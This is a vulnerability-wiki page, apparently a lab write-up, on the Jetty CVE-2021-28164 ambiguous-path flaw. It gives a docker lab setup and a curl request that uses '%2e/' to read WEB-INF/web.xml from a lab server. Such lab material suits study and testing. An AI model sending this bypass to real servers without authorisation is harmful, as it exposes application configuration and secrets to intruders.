<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/jetty/CVE-2021-28164/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-28164) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-28164)", url: "#_top", children: [
              {title: "Vulnerable Application", url: "#vulnerable-application" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Jetty WEB-INF 敏感信息泄露漏洞（CVE-2021-28164）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../java/rmi-registry-bind-deserialization-bypass/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../java/rmi-registry-bind-deserialization-bypass/README.zh-cn/" class="btn btn-xs btn-link">
        Java &lt; JDK8u232_b09 RMI Registry 反序列化远程代码执行绕过
      </a>
    </div>
    
  </div>

    

    <h1 id="jetty-ambiguous-paths-information-disclosure-vulnerability-cve-2021-28164">Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-28164)<a class="headerlink" href="#jetty-ambiguous-paths-information-disclosure-vulnerability-cve-2021-28164" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Eclipse Jetty is a Java web server and Java Servlet container.</p>
<p>Jetty release 9.4.37 introduced a more precise implementation of RFC3986 with regards to URI decoding, together with some new compliance modes to optionally allow support of some URI that may have ambiguous interpretation within the Servlet specified API methods behaviours. The default mode allowed % encoded . characters to be excluded for URI normalisation, which is correct by the RFC, but is not assumed by common Servlet implementations.</p>
<p>The default compliance mode allows requests with URIs that contain <code>%2e</code> or <code>%2e%2e</code> segments to access protected resources within the WEB-INF directory. For example a request to <code>/context/%2e/WEB-INF/web.xml</code> can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.</p>
<p>This bug is fixed on version 9.4.39.</p>
<p>Reference links.</p>
<ul>
<li><a href="https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5">https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5</a></li>
<li><a href="https://xz.aliyun.com/t/10039">https://xz.aliyun.com/t/10039</a></li>
</ul>
<h2 id="vulnerable-application">Vulnerable Application<a class="headerlink" href="#vulnerable-application" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start a Jetty 9.4.37 server.</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server starts, visit <code>http://your-ip:8080</code> to see an example page.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>The sensitive file web.xml is not accessible through <code>/WEB-INF/web.xml</code>.</p>
<p><img alt="" src="1.png" /></p>
<p>Use <code>%2e/</code> to bypass the restriction:</p>
<div class="highlight"><pre><span></span><code>curl -v &#39;http://192.168.1.162:8080/%2e/WEB-INF/web.xml&#39;
</code></pre></div>
<p><img alt="" src="2.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Jetty WEB-INF 敏感信息泄露漏洞（CVE-2021-28164）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../java/rmi-registry-bind-deserialization-bypass/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../java/rmi-registry-bind-deserialization-bypass/README.zh-cn/" class="btn btn-xs btn-link">
        Java &lt; JDK8u232_b09 RMI Registry 反序列化远程代码执行绕过
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>